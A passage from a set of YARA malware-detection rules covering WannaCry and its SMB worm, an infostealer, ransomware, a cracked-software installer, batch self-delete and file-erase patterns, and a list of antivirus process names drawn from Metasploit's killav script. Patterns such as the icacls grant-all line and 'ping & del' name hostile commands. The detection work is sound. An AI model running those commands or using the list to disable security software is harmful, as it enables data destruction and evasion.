$s3 = "\\HELP_DECRYPT_YOUR_FILES.txt" wide
$s4 = "SALT" fullword wide
$s5 = "$4e677664-9a63-458e-a365-deb792509557" fullword ascii
$s6 = "CreateEncryptor" fullword ascii
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_UnamedStealer {
meta:
author = "ditekSHen"
description = "Detects unknown infostealer. Observed as 2nd stage and injects into .NET AppLaunch.exe"
strings:
$s1 = "HideMelt" fullword ascii
$s2 = ".Implant" ascii
$s3 = "SetUseragent" fullword ascii
$s4 = "SendReport" fullword ascii
$s5 = "cookiesList" fullword ascii
$s6 = "WriteAppsList" fullword ascii
$s7 = "Timeout /T 2 /Nobreak" fullword wide
$s8 = "Directory not exists" wide
$s9 = "### {0} ### ({1})" wide
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_wannacry_1 : ransom
{
meta:
author = "Joshua Cannell"
description = "WannaCry Ransomware strings"
reference = "https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/"
weight = 100
date = "2017-05-12"
strings:
$s1 = "Ooops, your files have been encrypted!" wide ascii nocase
$s2 = "Wanna Decryptor" wide ascii nocase
$s3 = ".wcry" wide ascii nocase
$s4 = "WANNACRY" wide ascii nocase
$s5 = "WANACRY!" wide ascii nocase
$s7 = "icacls . /grant Everyone:F /T /C /Q" wide ascii nocase
condition:
any of them
}
rule SSC_wannacry_2{
meta:
author = "Harold Ogden"
description = "WannaCry Ransomware Strings"
reference = "https://securingtomorrow.mcafee.com/executive-perspectives/analysis-wannacry-ransomware-outbreak/"
date = "2017-05-12"
weight = 100
strings:
$string1 = "msg/m_bulgarian.wnry"
$string2 = "msg/m_chinese (simplified).wnry"
$string3 = "msg/m_chinese (traditional).wnry"
$string4 = "msg/m_croatian.wnry"
$string5 = "msg/m_czech.wnry"
$string6 = "msg/m_danish.wnry"
$string7 = "msg/m_dutch.wnry"
$string8 = "msg/m_english.wnry"
$string9 = "msg/m_filipino.wnry"
$string10 = "msg/m_finnish.wnry"
$string11 = "msg/m_french.wnry"
$string12 = "msg/m_german.wnry"
$string13 = "msg/m_greek.wnry"
$string14 = "msg/m_indonesian.wnry"
$string15 = "msg/m_italian.wnry"
$string16 = "msg/m_japanese.wnry"
$string17 = "msg/m_korean.wnry"
$string18 = "msg/m_latvian.wnry"
$string19 = "msg/m_norwegian.wnry"
$string20 = "msg/m_polish.wnry"
$string21 = "msg/m_portuguese.wnry"
$string22 = "msg/m_romanian.wnry"
$string23 = "msg/m_russian.wnry"
$string24 = "msg/m_slovak.wnry"
$string25 = "msg/m_spanish.wnry"
$string26 = "msg/m_swedish.wnry"
$string27 = "msg/m_turkish.wnry"
$string28 = "msg/m_vietnamese.wnry"
condition:
any of ($string*)
}
rule SSC_Win32_Ransomware_WannaCry : WannaCR
{
meta:
author              = "ReversingLabs"
source              = "ReversingLabs"
status              = "RELEASED"
sharing             = "TLP:WHITE"
category            = "MALWARE"
malware             = "WANNACRY"
description         = "Yara rule that detects WannaCry ransomware."
tc_detection_type   = "Ransomware"
tc_detection_name   = "WannaCry"
tc_detection_factor = 5
strings:
$main_1 = {
A0 ?? ?? ?? ?? 56 57 6A ?? 88 85 ?? ?? ?? ?? 59 33 C0 8D BD ?? ?? ?? ?? F3 AB 66 AB
AA 8D 85 ?? ?? ?? ?? 68 ?? ?? ?? ?? 50 53 FF 15 ?? ?? ?? ?? 8B 35 ?? ?? ?? ?? 8D 85
?? ?? ?? ?? 6A ?? 50 FF D6 59 85 C0 59 74 ?? 8D 85 ?? ?? ?? ?? 6A ?? 50 FF D6 59 88
18 59 8D 85 ?? ?? ?? ?? 50 FF 15 ?? ?? ?? ?? 68 ?? ?? ?? ?? 53 E8 ?? ?? ?? ?? 59 59
8D 8D ?? ?? ?? ?? E8 ?? ?? ?? ?? 53 53 53 8D 8D ?? ?? ?? ?? E8 ?? ?? ?? ?? 5F 5E 85
C0 74 ?? 8D 45 ?? 8D 8D ?? ?? ?? ?? 50 68 ?? ?? ?? ?? 89 5D
}
rule SSC_WannaCry_Ransomware_Dropper_X
{
meta:
description = "WannaCry Ransomware Dropper"
reference = "https://www.cylance.com/en_us/blog/threat-spotlight-inside-the-wannacry-attack.html"
date = "2017-05-12"
strings:
$s1 = "cmd.exe /c \"%s\"" fullword ascii
$s2 = "tasksche.exe" fullword ascii
$s3 = "icacls . /grant Everyone:F /T /C /Q" fullword ascii
$s4 = "Global\\MsWinZonesCacheCounterMutexA" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 4MB and all of them
}
rule SSC_WannaCry_SMB_Exploit
{
meta:
description = "WannaCry SMB Exploit"
reference = "https://www.cylance.com/en_us/blog/threat-spotlight-inside-the-wannacry-attack.html"
date = "2017-05-12"
strings:
$s1 = { 53 4D 42 72 00 00 00 00 18 53 C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FE 00 00 40 00 00 62 00 02 50 43 20 4E 45 54 57 4F 52 4B 20 50 52 4F 47 52 41 4D 20 31 2E 30 00 02 4C 41 4E 4D 41 4E 31 2E 30 00 02 57 69 6E 64 6F 77 73 20 66 6F 72 20 57 6F 72 6B 67 72 6F 75 70 73 20 33 2E 31 61 00 02 4C 4D 31 2E 32 58 30 30 32 00 02 4C 41 4E 4D 41 4E 32 2E 31 00 02 4E 54 20 4C 4D 20 30 2E 31 32 00 00 00 00 00 00 00 88 FF 53 4D 42 73 00 00 00 00 18 07 C0 }
condition:
uint16(0) == 0x5a4d and filesize < 4MB and all of them and pe.imports("ws2_32.dll", "connect") and pe.imports("ws2_32.dll", "send") and pe.imports("ws2_32.dll", "recv") and pe.imports("ws2_32.dll", "socket") and pe.imports("ws2_32.dll", "closesocket")
}
rule SSC_wannacry_static_ransom : WannaRS {
meta:
description = "Detects WannaCryptor spreaded during 2017-May-12th campaign and variants"
author = "Blueliv"
reference = "https://blueliv.com/research/wannacrypt-malware-analysis/"
date = "2017-05-15"
strings:
$mutex01 = "Global\\MsWinZonesCacheCounterMutexA" ascii
$lang01 = "m_bulgarian.wnr" ascii
$lang02 = "m_vietnamese.wnry" ascii
$startarg01 = "StartTask" ascii
$startarg02 = "TaskStart" ascii
$startarg03 = "StartSchedule" ascii
$wcry01 = "WanaCrypt0r" ascii wide
$wcry02 = "WANACRY" ascii
$wcry03 = "WANNACRY" ascii
$wcry04 = "WNCRYT" ascii wide
$forig01 = ".wnry\x00" ascii
$fvar01 = ".wry\x00" ascii
condition:
($mutex01 or any of ($lang*)) and ( $forig01 or all of ($fvar*) ) and any of ($wcry*) and any of ($startarg*)
}
rule SSC_wannacry_memory_ransom : WannaRS {
meta:
description = "Detects WannaCryptor spreaded during 2017-May-12th campaign and variants in memory"
author = "Blueliv"
reference = "https://blueliv.com/research/wannacrypt-malware-analysis/"
date = "2017-05-15"
strings:
$s01 = "%08X.eky"
$s02 = "%08X.pky"
$s03 = "%08X.res"
$s04 = "%08X.dky"
$s05 = "@WanaDecryptor@.exe"
condition:
all of them
}
rule SSC_worm_ms17_010 : WannaWorm {
meta:
description = "Detects Worm used during 2017-May-12th WannaCry campaign, which is based on ETERNALBLUE"
author = "Blueliv"
reference = "https://blueliv.com/research/wannacrypt-malware-analysis/"
date = "2017-05-15"
strings:
$s01 = "__TREEID__PLACEHOLDER__" ascii
$s02 = "__USERID__PLACEHOLDER__@" ascii
$s03 = "SMB3"
$s05 = "SMBu"
$s06 = "SMBs"
$s07 = "SMBr"
$s08 = "%s -m security" ascii
$s09 = "%d.%d.%d.%d"
$payloadwin2000_2195 =
"\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00"
$payload2000_50 =
"\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00\x2e\x00\x30\x00\x00\x00"
condition:
all of them
}
rule SSC_autogen_peexe_FingerprintGreywareOverlayPackedShell32dll_bf21259d
{
meta:
author = "FileScan.IO Engine v1.1.0-4a53dc2"
date = "2023-02-12"
sample = "bf21259d2f013a429527783a1d68e17b1705499acd31db237e6d2ed85fb2f937"
score = 75
tags = "fingerprint,greyware,overlay,packed,shell32.dll"
isWeakRule = false
strings:
//IOC patterns
$req0 = "2015, Crackingpatching.com Team"
$req1 = "CrackingPatching.com"
$req2 = "Crackingpatching.com Team"
$req3 = "SOFTWARE\\Borland\\Delphi\\RTL"
$req4 = "SOFTWARE\\Microsoft\\.NETFramework\\policy"
$req5 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
$req6 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"
$req7 = "Software\\Microsoft\\Windows"
$req8 = "Software\\Microsoft\\Windows\\CurrentVersion\\GrpConv\\MapGroups"
$req9 = "http://crackingpatching.com"
$req10 = "http://crackingpatching.com/2016/12/idm-6-27-build-2-full-patch-crack-free-download-latest.html"
$req11 = "http://www.crackingpatching.com"
$req12 = "http://www.crackingpatching.com/2015/12/internet-download-manager-idm-625-build_11.html"
$req13 = "orichec@kickass.com"
//optional strings
$opt0 = "AdjustTokenPrivileges"
$opt1 = "AllocateAndInitializeSid"
$opt2 = "CallWindowProcA"
$opt3 = "CoCreateInstance"
$opt4 = "CoInitialize"
$opt5 = "CoTaskMemFree"
$opt6 = "CoUninitialize"
$opt7 = "CompareFileTime"
$opt8 = "CreateBitmap"
$opt9 = "CreateDirectoryA"
$opt10 = "CreateFileA"
$opt11 = "CreateToolhelp32Snapshot"
$opt12 = "CreateWindowExA"
$opt13 = "DefWindowProcA"
$opt14 = "DeleteCriticalSection"
$opt15 = "DeleteFileA"
$opt16 = "DestroyIcon"
$opt17 = "DestroyWindow"
$opt18 = "DispatchMessageA"
$opt19 = "DisplayName"
$opt20 = "DllRegisterServer"
$opt21 = "DosDateTimeToFileTime"
$opt22 = "EmptyWorkingSet"
$opt23 = "EnableWindow"
$opt24 = "EnterCriticalSection"
$opt25 = "EnumDeviceDrivers"
$opt26 = "EnumProcessModules"
$opt27 = "EnumProcesses"
$opt28 = "EnumWindows"
$opt29 = "ExitProcess"
$opt30 = "ExitWindowsEx"
$opt31 = "ExpandEnvironmentStringsA"
$opt32 = "FDIDestroy"
$opt33 = "FileTimeToLocalFileTime"
$opt34 = "FileTimeToSystemTime"
$opt35 = "FindFirstFileA"
$opt36 = "FindNextFileA"
$opt37 = "FindWindowA"
$opt38 = "FreeLibrary"
$opt39 = "GetCapture"
$opt40 = "GetClassLongA"
$opt41 = "GetCommandLineA"
$opt42 = "GetComputerNameA"
$opt43 = "GetCurrentProcess"
$opt44 = "GetCurrentThread"
$opt45 = "GetCurrentThreadId"
$opt46 = "GetCursorPos"
$opt47 = "GetDateFormatA"
$opt48 = "GetDeviceDriverBaseNameA"
$opt49 = "GetDeviceDriverBaseNameW"
$opt50 = "GetDeviceDriverFileNameA"
$opt51 = "GetDeviceDriverFileNameW"
$opt52 = "GetDiskFreeSpaceA"
$opt53 = "GetDiskFreeSpaceExA"
$opt54 = "GetExitCodeProcess"
$opt55 = "GetFileAttributesA"
$opt56 = "GetFileSize"
$opt57 = "GetFileTime"
$opt58 = "GetFullPathNameA"
$opt59 = "GetKeyState"
$opt60 = "GetKeyboardType"
$opt61 = "GetLastError"
$opt62 = "GetLocalTime"
$opt63 = "GetLocaleInfoA"
$opt64 = "GetMappedFileNameA"
$opt65 = "GetMappedFileNameW"
$opt66 = "GetModuleBaseNameA"
$opt67 = "GetModuleBaseNameW"
$opt68 = "GetModuleFileNameA"
$opt69 = "GetModuleFileNameExA"
$opt70 = "GetModuleFileNameExW"
$opt71 = "GetModuleHandleA"
$opt72 = "GetModuleInformation"
$opt73 = "GetPrivateProfileStringA"
$opt74 = "GetProcAddress"
$opt75 = "GetProcessMemoryInfo"
$opt76 = "GetShortPathNameA"
$opt77 = "GetStartupInfoA"
$opt78 = "GetStdHandle"
$opt79 = "GetSystemDirectoryA"
$opt80 = "GetSystemMetrics"
$opt81 = "GetTempPathA"
$opt82 = "GetThreadLocale"
$opt83 = "GetTimeFormatA"
$opt84 = "GetTokenInformation"
$opt85 = "GetUserNameA"
$opt86 = "GetVersion"
$opt87 = "GetVersionExA"
$opt88 = "GetWindowLongA"
$opt89 = "GetWindowTextA"
$opt90 = "GetWindowTextLengthA"
$opt91 = "GetWindowsDirectoryA"
$opt92 = "GlobalAlloc"
$opt93 = "GlobalFree"
$opt94 = "Heap32First"
$opt95 = "Heap32ListFirst"
$opt96 = "Heap32ListNext"
$opt97 = "Heap32Next"
$opt98 = "InitializeCriticalSection"
$opt99 = "InitializeProcessForWsWatch"
$opt100 = "IsWindowEnabled"
$opt101 = "IsWindowVisible"
$opt102 = "LeaveCriticalSection"
$opt103 = "LoadCursorA"
$opt104 = "LoadLibraryA"
$opt105 = "LocalAlloc"
$opt106 = "LocalFileTimeToFileTime"
$opt107 = "LookupPrivilegeValueA"
$opt108 = "Module32First"
$opt109 = "Module32FirstW"
$opt110 = "Module32Next"
$opt111 = "Module32NextW"
$opt112 = "OleInitialize"
$opt113 = "OpenProcess"
$opt114 = "OpenProcessToken"
$opt115 = "OpenThreadToken"
$opt116 = "PeekMessageA"
$opt117 = "PostMessageA"
$opt118 = "PostQuitMessage"
$opt119 = "Process32First"
$opt120 = "Process32FirstW"
$opt121 = "Process32Next"
$opt122 = "Process32NextW"
$opt123 = "QueryWorkingSet"
$opt124 = "RaiseException"
$opt125 = "RegCloseKey"
$opt126 = "RegCreateKeyExA"
$opt127 = "RegEnumKeyExA"
$opt128 = "RegOpenKeyExA"
$opt129 = "RegQueryInfoKeyA"
$opt130 = "RegQueryValueExA"
$opt131 = "RegSetValueExA"
$opt132 = "RegisterClassA"
$opt133 = "RemoveDirectoryA"
$opt134 = "SHBrowseForFolderA"
$opt135 = "SHChangeNotify"
$opt136 = "SHGetFileInfoA"
$opt137 = "SHGetMalloc"
$opt138 = "SHGetPathFromIDListA"
$opt139 = "SHGetSpecialFolderLocation"
$opt140 = "Select additional shortcuts."
$opt141 = "Select any additional shortcuts for IDM Patch 6.27 that you would like created by the installation:"
$opt142 = "Select shortcuts"
$opt143 = "Select the Start Menu folder in which you would like to create the program's shortcuts. You can also enter a name to create a ne"
$opt144 = "Select the folder to install IDM Patch 6.27 in:"
$opt145 = "SendMessageA"
$opt146 = "SetCurrentDirectoryA"
$opt147 = "SetEndOfFile"
$opt148 = "SetErrorMode"
$opt149 = "SetFileAttributesA"
$opt150 = "SetFilePointer"
$opt151 = "SetFileTime"
$opt152 = "SetForegroundWindow"
$opt153 = "SetWindowLongA"
$opt154 = "SetWindowPos"
$opt155 = "ShellExecuteA"
$opt156 = "ShellExecuteExA"
$opt157 = "ShowWindow"
$opt158 = "SysAllocStringLen"
$opt159 = "SysFreeString"
$opt160 = "SysReAllocStringLen"
$opt161 = "SystemTimeToFileTime"
$opt162 = "TerminateProcess"
$opt163 = "Thread32First"
$opt164 = "Thread32Next"
$opt165 = "TlsGetValue"
$opt166 = "TlsSetValue"
$opt167 = "Toolhelp32ReadProcessMemory"
$opt168 = "TranslateMessage"
$opt169 = "UnhandledExceptionFilter"
$opt170 = "VirtualAlloc"
$opt171 = "VirtualFree"
$opt172 = "WaitForSingleObject"
$opt173 = "WaitMessage"
$opt174 = "WritePrivateProfileStringA"
$opt175 = "advapi32.dll"
$opt176 = "cabinet.dll"
$opt177 = "comctl32.dll"
$opt178 = "kernel32.dll"
$opt179 = "oleaut32.dll"
$opt180 = "shell32.dll"
$opt181 = "user32.dll"
$opt182 = "uxtheme.dll"
$opt183 = "wvsprintfA"
condition:
//require 70% of IOC patterns and require 40% of optional strings
uint16(0) == 0x5A4D and filesize > 1274369 and filesize < 8068673 and 8 of ($req*) and 80 of ($opt*)
}
rule SSC_File_Eraser
{
meta:
filetype = "bat"
strings:
$main1 = " del " nocase
$main2 = " erase " nocase
$s1 = "/Q " nocase
$s2 = "/S " nocase
$p1 = " *."
condition:
(any of ($main*) ) and ( all of ($s*) ) and $p1 and filesize < 1000KB
}
rule SSC_Bat_NjRat_X
{
meta:
filetype = "bat"
strings:
$s1 = "ping 127.0.0.1 & del" nocase
$s2 = "ping 0 & del" nocase
$s3 = "ping 127.0.0.1 & erase" nocase
$s4 = "ping 0 & erase" nocase
condition:
any of them
}
rule SSC_Antivirus_Contains
{
meta:
description = "Contains references to security software"
author = "Jerome Athias"
source = "Metasploit's killav.rb script"
strings:
$a0 = "AAWTray.exe" nocase wide ascii
$a1 = "Ad-Aware.exe" nocase wide ascii
$a2 = "MSASCui.exe" nocase wide ascii
$a3 = "_avp32.exe" nocase wide ascii
$a4 = "_avpcc.exe" nocase wide ascii
$a5 = "_avpm.exe" nocase wide ascii
$a6 = "aAvgApi.exe" nocase wide ascii
$a7 = "ackwin32.exe" nocase wide ascii
$a8 = "adaware.exe" nocase wide ascii
$a9 = "advxdwin.exe" nocase wide ascii
$a10 = "agentsvr.exe" nocase wide ascii
$a11 = "agentw.exe" nocase wide ascii
$a12 = "alertsvc.exe" nocase wide ascii
$a13 = "alevir.exe" nocase wide ascii
$a14 = "alogserv.exe" nocase wide ascii
$a15 = "amon9x.exe" nocase wide ascii
$a16 = "anti-trojan.exe" nocase wide ascii
$a17 = "antivirus.exe" nocase wide ascii
$a18 = "ants.exe" nocase wide ascii
$a19 = "apimonitor.exe" nocase wide ascii
$a20 = "aplica32.exe" nocase wide ascii
$a21 = "apvxdwin.exe" nocase wide ascii
$a22 = "arr.exe" nocase wide ascii
$a23 = "atcon.exe" nocase wide ascii
$a24 = "atguard.exe" nocase wide ascii
$a25 = "atro55en.exe" nocase wide ascii
$a26 = "atupdater.exe" nocase wide ascii
$a27 = "atwatch.exe" nocase wide ascii
$a28 = "au.exe" nocase wide ascii
$a29 = "aupdate.exe" nocase wide ascii
$a31 = "autodown.exe" nocase wide ascii
$a32 = "autotrace.exe" nocase wide ascii
$a33 = "autoupdate.exe" nocase wide ascii
$a34 = "avconsol.exe" nocase wide ascii
$a35 = "ave32.exe" nocase wide ascii
$a36 = "avgcc32.exe" nocase wide ascii
$a37 = "avgctrl.exe" nocase wide ascii
$a38 = "avgemc.exe" nocase wide ascii
$a39 = "avgnt.exe" nocase wide ascii
$a40 = "avgrsx.exe" nocase wide ascii
$a41 = "avgserv.exe" nocase wide ascii
$a42 = "avgserv9.exe" nocase wide ascii
$a43 = /av(gui|guard|center|gtray|gidsagent|gwdsvc|grsa|gcsrva|gcsrvx).exe/ nocase wide ascii
$a44 = "avgw.exe" nocase wide ascii
$a45 = "avkpop.exe" nocase wide ascii
$a46 = "avkserv.exe" nocase wide ascii
$a47 = "avkservice.exe" nocase wide ascii
$a48 = "avkwctl9.exe" nocase wide ascii
$a49 = "avltmain.exe" nocase wide ascii
$a50 = "avnt.exe" nocase wide ascii
$a51 = "avp.exe" nocase wide ascii
$a52 = "avp.exe" nocase wide ascii
$a53 = "avp32.exe" nocase wide ascii
$a54 = "avpcc.exe" nocase wide ascii
$a55 = "avpdos32.exe" nocase wide ascii
$a56 = "avpm.exe" nocase wide ascii
$a57 = "avptc32.exe" nocase wide ascii
$a58 = "avpupd.exe" nocase wide ascii
$a59 = "avsched32.exe" nocase wide ascii
$a60 = "avsynmgr.exe" nocase wide ascii
$a61 = "avwin.exe" nocase wide ascii
$a62 = "avwin95.exe" nocase wide ascii
$a63 = "avwinnt.exe" nocase wide ascii
$a64 = "avwupd.exe" nocase wide ascii
$a65 = "avwupd32.exe" nocase wide ascii
$a66 = "avwupsrv.exe" nocase wide ascii
$a67 = "avxmonitor9x.exe" nocase wide ascii
$a68 = "avxmonitornt.exe" nocase wide ascii
$a69 = "avxquar.exe" nocase wide ascii
$a73 = "beagle.exe" nocase wide ascii
$a74 = "belt.exe" nocase wide ascii
$a75 = "bidef.exe" nocase wide ascii
$a76 = "bidserver.exe" nocase wide ascii
$a77 = "bipcp.exe" nocase wide ascii
$a79 = "bisp.exe" nocase wide ascii
$a80 = "blackd.exe" nocase wide ascii
$a81 = "blackice.exe" nocase wide ascii
$a82 = "blink.exe" nocase wide ascii
$a83 = "blss.exe" nocase wide ascii
$a84 = "bootconf.exe" nocase wide ascii
$a85 = "bootwarn.exe" nocase wide ascii
$a86 = "borg2.exe" nocase wide ascii
$a87 = "bpc.exe" nocase wide ascii
$a89 = "bs120.exe" nocase wide ascii
$a90 = "bundle.exe" nocase wide ascii
$a91 = "bvt.exe" nocase wide ascii
$a92 = "ccapp.exe" nocase wide ascii
$a93 = "ccevtmgr.exe" nocase wide ascii
$a94 = "ccpxysvc.exe" nocase wide ascii
$a95 = "cdp.exe" nocase wide ascii
$a96 = "cfd.exe" nocase wide ascii
$a97 = "cfgwiz.exe" nocase wide ascii
$a98 = "cfiadmin.exe" nocase wide ascii
$a99 = "cfiaudit.exe" nocase wide ascii
$a100 = "cfinet.exe" nocase wide ascii
$a101 = "cfinet32.exe" nocase wide ascii
$a102 = "claw95.exe" nocase wide ascii
$a103 = "claw95cf.exe" nocase wide ascii
$a104 = "clean.exe" nocase wide ascii
$a105 = "cleaner.exe" nocase wide ascii
$a106 = "cleaner3.exe" nocase wide ascii
$a107 = "cleanpc.exe" nocase wide ascii
$a108 = "click.exe" nocase wide ascii
$a111 = "cmesys.exe" nocase wide ascii
$a112 = "cmgrdian.exe" nocase wide ascii
$a113 = "cmon016.exe" nocase wide ascii
$a114 = "connectionmonitor.exe" nocase wide ascii
$a115 = "cpd.exe" nocase wide ascii
$a116 = "cpf9x206.exe" nocase wide ascii
$a117 = "cpfnt206.exe" nocase wide ascii
$a118 = "ctrl.exe" nocase wide ascii fullword
$a119 = "cv.exe" nocase wide ascii
$a120 = "cwnb181.exe" nocase wide ascii
$a121 = "cwntdwmo.exe" nocase wide ascii
$a123 = "dcomx.exe" nocase wide ascii
$a124 = "defalert.exe" nocase wide ascii
$a125 = "defscangui.exe" nocase wide ascii
$a126 = "defwatch.exe" nocase wide ascii
$a127 = "deputy.exe" nocase wide ascii
$a129 = "dllcache.exe" nocase wide ascii
$a130 = "dllreg.exe" nocase wide ascii
$a132 = "dpf.exe" nocase wide ascii
$a134 = "dpps2.exe" nocase wide ascii
$a135 = "drwatson.exe" nocase wide ascii
$a136 = "drweb32.exe" nocase wide ascii
$a137 = "drwebupw.exe" nocase wide ascii
$a138 = "dssagent.exe" nocase wide ascii
$a139 = "dvp95.exe" nocase wide ascii
$a140 = "dvp95_0.exe" nocase wide ascii
$a141 = "ecengine.exe" nocase wide ascii
$a142 = "efpeadm.exe" nocase wide ascii
$a143 = "emsw.exe" nocase wide ascii
$a145 = "esafe.exe" nocase wide ascii
$a146 = "escanhnt.exe" nocase wide ascii
$a147 = "escanv95.exe" nocase wide ascii
$a148 = "espwatch.exe" nocase wide ascii
$a150 = "etrustcipe.exe" nocase wide ascii
$a151 = "evpn.exe" nocase wide ascii
$a152 = "exantivirus-cnet.exe" nocase wide ascii
$a153 = "exe.avxw.exe" nocase wide ascii
$a154 = "expert.exe" nocase wide ascii
$a156 = "f-agnt95.exe" nocase wide ascii
$a157 = "f-prot.exe" nocase wide ascii
$a158 = "f-prot95.exe" nocase wide ascii
$a159 = "f-stopw.exe" nocase wide ascii
$a160 = "fameh32.exe" nocase wide ascii
$a161 = "fast.exe" nocase wide ascii
$a162 = "fch32.exe" nocase wide ascii
$a163 = "fih32.exe" nocase wide ascii
$a164 = "findviru.exe" nocase wide ascii
$a165 = "firewall.exe" nocase wide ascii
$a166 = "fnrb32.exe" nocase wide ascii
$a167 = "fp-win.exe" nocase wide ascii
$a169 = "fprot.exe" nocase wide ascii
$a170 = "frw.exe" nocase wide ascii
$a171 = "fsaa.exe" nocase wide ascii
$a172 = "fsav.exe" nocase wide ascii
$a173 = "fsav32.exe" nocase wide ascii
$a176 = "fsav95.exe" nocase wide ascii
$a177 = "fsgk32.exe" nocase wide ascii
$a178 = "fsm32.exe" nocase wide ascii
$a179 = "fsma32.exe" nocase wide ascii
$a180 = "fsmb32.exe" nocase wide ascii
$a181 = "gator.exe" nocase wide ascii
$a182 = "gbmenu.exe" nocase wide ascii
$a183 = "gbpoll.exe" nocase wide ascii
$a184 = "generics.exe" nocase wide ascii
$a185 = "gmt.exe" nocase wide ascii
$a186 = "guard.exe" nocase wide ascii
$a187 = "guarddog.exe" nocase wide ascii
$a189 = "hbinst.exe" nocase wide ascii
$a190 = "hbsrv.exe" nocase wide ascii
$a191 = "hotactio.exe" nocase wide ascii
$a192 = "hotpatch.exe" nocase wide ascii
$a193 = "htlog.exe" nocase wide ascii
$a194 = "htpatch.exe" nocase wide ascii
$a195 = "hwpe.exe" nocase wide ascii
$a196 = "hxdl.exe" nocase wide ascii
$a197 = "hxiul.exe" nocase wide ascii
$a198 = "iamapp.exe" nocase wide ascii
$a199 = "iamserv.exe" nocase wide ascii
$a200 = "iamstats.exe" nocase wide ascii
$a201 = "ibmasn.exe" nocase wide ascii
$a202 = "ibmavsp.exe" nocase wide ascii
$a203 = "icload95.exe" nocase wide ascii
$a204 = "icloadnt.exe" nocase wide ascii
$a205 = "icmon.exe" nocase wide ascii
$a206 = "icsupp95.exe" nocase wide ascii
$a207 = "icsuppnt.exe" nocase wide ascii
$a209 = "iedll.exe" nocase wide ascii
$a210 = "iedriver.exe" nocase wide ascii
$a212 = "iface.exe" nocase wide ascii
$a213 = "ifw2000.exe" nocase wide ascii
$a214 = "inetlnfo.exe" nocase wide ascii
$a215 = "infus.exe" nocase wide ascii
$a216 = "infwin.exe" nocase wide ascii
$a218 = "intdel.exe" nocase wide ascii
$a219 = "intren.exe" nocase wide ascii
$a220 = "iomon98.exe" nocase wide ascii
$a221 = "istsvc.exe" nocase wide ascii
$a222 = "jammer.exe" nocase wide ascii
$a224 = "jedi.exe" nocase wide ascii
$a227 = "kavpf.exe" nocase wide ascii
$a228 = "kazza.exe" nocase wide ascii
$a229 = "keenvalue.exe" nocase wide ascii
$a236 = "ldnetmon.exe" nocase wide ascii
$a237 = "ldpro.exe" nocase wide ascii
$a238 = "ldpromenu.exe" nocase wide ascii
$a239 = "ldscan.exe" nocase wide ascii
$a240 = "lnetinfo.exe" nocase wide ascii
$a242 = "localnet.exe" nocase wide ascii
$a243 = "lockdown.exe" nocase wide ascii
$a244 = "lockdown2000.exe" nocase wide ascii
$a245 = "lookout.exe" nocase wide ascii
$a248 = "luall.exe" nocase wide ascii
$a249 = "luau.exe" nocase wide ascii
$a250 = "lucomserver.exe" nocase wide ascii
$a251 = "luinit.exe" nocase wide ascii
$a252 = "luspt.exe" nocase wide ascii
$a253 = "mapisvc32.exe" nocase wide ascii
$a254 = "mcagent.exe" nocase wide ascii
$a255 = "mcmnhdlr.exe" nocase wide ascii
$a256 = "mcshield.exe" nocase wide ascii
$a257 = "mctool.exe" nocase wide ascii
$a258 = "mcupdate.exe" nocase wide ascii
$a259 = "mcvsrte.exe" nocase wide ascii
$a260 = "mcvsshld.exe" nocase wide ascii
$a262 = "mfin32.exe" nocase wide ascii
$a263 = "mfw2en.exe" nocase wide ascii
$a265 = "mgavrtcl.exe" nocase wide ascii
$a266 = "mgavrte.exe" nocase wide ascii
$a267 = "mghtml.exe" nocase wide ascii
$a268 = "mgui.exe" nocase wide ascii
$a269 = "minilog.exe" nocase wide ascii
$a270 = "mmod.exe" nocase wide ascii
$a271 = "monitor.exe" nocase wide ascii
$a272 = "moolive.exe" nocase wide ascii
$a273 = "mostat.exe" nocase wide ascii
$a274 = "mpfagent.exe" nocase wide ascii
$a275 = "mpfservice.exe" nocase wide ascii
$a276 = "mpftray.exe" nocase wide ascii
$a277 = "mrflux.exe" nocase wide ascii
$a278 = "msapp.exe" nocase wide ascii
$a279 = "msbb.exe" nocase wide ascii
$a280 = "msblast.exe" nocase wide ascii
$a281 = "mscache.exe" nocase wide ascii
$a282 = "msccn32.exe" nocase wide ascii
$a283 = "mscman.exe" nocase wide ascii
$a285 = "msdm.exe" nocase wide ascii
$a286 = "msdos.exe" nocase wide ascii
$a287 = "msiexec16.exe" nocase wide ascii
$a288 = "msinfo32.exe" nocase wide ascii
$a289 = "mslaugh.exe" nocase wide ascii
$a290 = "msmgt.exe" nocase wide ascii
$a291 = "msmsgri32.exe" nocase wide ascii
$a292 = "mssmmc32.exe" nocase wide ascii
$a293 = "mssys.exe" nocase wide ascii
$a294 = "msvxd.exe" nocase wide ascii
$a295 = "mu0311ad.exe" nocase wide ascii
$a296 = "mwatch.exe" nocase wide ascii
$a297 = "n32scanw.exe" nocase wide ascii
$a298 = "nav.exe" nocase wide ascii
$a300 = "navapsvc.exe" nocase wide ascii
$a301 = "navapw32.exe" nocase wide ascii
$a302 = "navdx.exe" nocase wide ascii
$a303 = "navlu32.exe" nocase wide ascii
$a304 = "navnt.exe" nocase wide ascii
$a305 = "navstub.exe" nocase wide ascii
$a306 = "navw32.exe" nocase wide ascii
$a307 = "navwnt.exe" nocase wide ascii
$a308 = "nc2000.exe" nocase wide ascii
$a309 = "ncinst4.exe" nocase wide ascii
$a310 = "ndd32.exe" nocase wide ascii
$a311 = "neomonitor.exe" nocase wide ascii
$a312 = "neowatchlog.exe" nocase wide ascii
$a313 = "netarmor.exe" nocase wide ascii
$a314 = "netd32.exe" nocase wide ascii
$a315 = "netinfo.exe" nocase wide ascii
$a317 = "netscanpro.exe" nocase wide ascii
$a320 = "netutils.exe" nocase wide ascii
$a321 = "nisserv.exe" nocase wide ascii
$a322 = "nisum.exe" nocase wide ascii
$a323 = "nmain.exe" nocase wide ascii
$a324 = "nod32.exe" nocase wide ascii
$a325 = "normist.exe" nocase wide ascii
